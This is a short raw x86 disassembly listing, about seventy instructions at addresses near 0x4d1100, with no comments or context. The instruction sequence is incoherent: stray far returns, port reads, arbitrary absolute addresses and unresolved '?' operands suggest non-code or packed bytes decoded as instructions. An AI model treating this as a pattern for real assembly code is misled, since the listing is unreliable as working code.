  4d1093:	fdivr  DWORD PTR [eax+0x40]
  4d1096:	popf   
  4d1097:	fnstenv [edi+0x40]
  4d109a:	retf   0x878a
  4d109d:	adc    eax,0x7d86e0ea
  4d10a2:	push   0xffffffe0
  4d10a4:	test   DWORD PTR [ebp+0x0],edi
  4d10a7:	jecxz  0x4d1097
  4d10a9:	jge    0x4d1115
  4d10ab:	loop   0x4d1032
  4d10ad:	jge    0x4d1119
  4d10af:	loop   0x4d10b5
  4d10b1:	sub    dl,BYTE PTR [ebp+0x51ab1fb7]
  4d10b7:	mov    bl,0x1d
  4d10b9:	stos   DWORD PTR es:[edi],eax
  4d10ba:	push   ecx
  4d10bb:	jo     0x4d1049
  4d10bd:	repz scas al,BYTE PTR es:[edi]
  4d10bf:	mov    al,ds:0xc10c2776
  4d10c4:	sti    
  4d10c5:	sbb    ecx,DWORD PTR [eax]
  4d10c7:	mov    WORD PTR [ebp+0x6740a7a3],?
  4d10cd:	cwde   
  4d10ce:	mov    BYTE PTR ds:[esi+0x14],0x76
  4d10d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d10d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d10d5:	scas   ax,WORD PTR es:[edi]
  4d10d7:	mov    edi,0xd371da45
  4d10dc:	fnsave [ebp+ebp*8+0x7]
  4d10e0:	sbb    al,0x57
  4d10e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d10e3:	fwait
  4d10e4:	ret    
  4d10e5:	cmp    cl,BYTE PTR [ecx]
  4d10e7:	mov    WORD PTR [ebx+esi*8],?
  4d10ea:	mov    ds:0x399f7909,eax
  4d10ef:	and    BYTE PTR [eax+0x1c],dh
  4d10f2:	xor    al,BYTE PTR [edi-0x79db0538]
  4d10f8:	xchg   esi,esp
  4d10fa:	and    eax,0xc7ae3b0d
  4d10ff:	retf   0x11b5
  4d1102:	fwait
  4d1103:	in     al,dx
  4d1104:	mov    dh,0x82
  4d1106:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d1107:	pop    ebx
  4d1108:	mov    ch,0x82
  4d110a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d110b:	pop    ebx
  4d110c:	mov    ah,0x82
  4d110e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d110f:	pop    ebx
  4d1110:	mov    bl,0x82
  4d1112:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d1113:	pop    ebx
  4d1114:	mov    dl,0x82
  4d1116:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d1117:	pop    ebx
  4d1118:	mov    cl,0x82
  4d111a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d111b:	pop    ebx
  4d111c:	mov    al,0x82
  4d111e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d111f:	pop    ebx
  4d1120:	scas   eax,DWORD PTR es:[edi]
  4d1121:	and    BYTE PTR [ebx+ebx*2+0x5ba4daae],0xad
  4d1129:	and    BYTE PTR [ecx-0x5e7953a5],0x5b
  4d1130:	dec    ebp
  4d1131:	add    BYTE PTR ss:[esi-0x5d0ec0d7],bh
